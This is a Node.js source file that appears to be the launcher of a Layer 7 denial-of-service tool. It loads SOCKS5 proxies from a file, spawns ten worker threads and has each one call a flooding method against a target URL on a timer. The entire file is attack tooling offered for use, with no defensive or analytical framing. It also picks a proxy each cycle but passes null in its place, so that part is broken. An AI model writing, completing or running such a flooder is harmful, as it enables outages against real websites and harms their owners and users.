const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const layer7 = require('./methods/layer7');

const socks5Proxies = require('fs').readFileSync('socks5.txt', 'utf8').split('\n').filter(Boolean);

if (!isMainThread) {
    const { targetUrl, delay, kbSize, method } = workerData;
    const target = new URL(targetUrl);

    setInterval(() => {
        const proxy = socks5Proxies[Math.floor(Math.random() * socks5Proxies.length)];
        const [proxyIp, proxyPort] = proxy.split(':');

        if (layer7[method]) {
            layer7[method](null, target, kbSize); 
        } else {
            console.error(`LDS: Method ${method} not found.`);
        }
    }, delay);
}

function start(targetUrl, delay, kbSize, method) {
    const numWorkers = 10; 
    for (let i = 0; i < numWorkers; i++) {
        const worker = new Worker(__filename, {
            workerData: { targetUrl, delay, kbSize, method },
        });

        worker.on('error', (err) => {
            console.error(`LDS: Worker error: ${err.message}`);
        });
    }
}

module.exports = { start };
